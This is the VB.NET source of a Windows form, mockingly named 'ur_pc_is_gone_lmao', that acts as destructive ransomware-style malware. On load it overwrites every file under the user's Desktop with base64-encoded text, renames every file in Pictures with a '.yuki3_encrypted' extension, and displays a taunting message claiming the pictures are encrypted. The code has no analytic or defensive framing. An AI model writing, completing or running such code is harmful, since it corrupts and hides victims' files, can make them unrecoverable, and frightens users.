Public Class ur_pc_is_gone_lmao
    Private Sub ur_pc_is_gone_lmao_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
            Dim sourceDirectory As String = My.Computer.FileSystem.SpecialDirectories.MyPictures
            Dim targetExtension As String = ".yuki3_encrypted"
            Dim Files() As System.IO.FileInfo
            Dim dir1 = My.Computer.FileSystem.SpecialDirectories.Desktop
            Dim dirinfo As New System.IO.DirectoryInfo(dir1)
            Files = dirinfo.GetFiles("*", System.IO.SearchOption.AllDirectories)
            For Each file In Files
                Try
                    Dim fileReader As String
                    fileReader = My.Computer.FileSystem.ReadAllText(file.FullName)
                    Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(fileReader)
                    Dim inc = System.Convert.ToBase64String(byt)
                    Dim sWriter As New System.IO.StreamWriter(file.FullName, False)
                    sWriter.Write(inc)
                    sWriter.Close()
                Catch ex As Exception

                End Try
            Next
            Dim files2 As String() = System.IO.Directory.GetFiles(sourceDirectory, "*.*")
            For Each file As String In files2

                Try
                    Dim fileName As String = System.IO.Path.GetFileNameWithoutExtension(file)
                    Dim newPath As String = System.IO.Path.Combine(sourceDirectory, fileName & targetExtension)
                    System.IO.File.Move(file, newPath)
                Catch ex As Exception

                End Try
            Next
            MsgBox("your Pictures has been encrypted lmao", 0 + 64, "LMAO")
        End If
    End Sub
End Class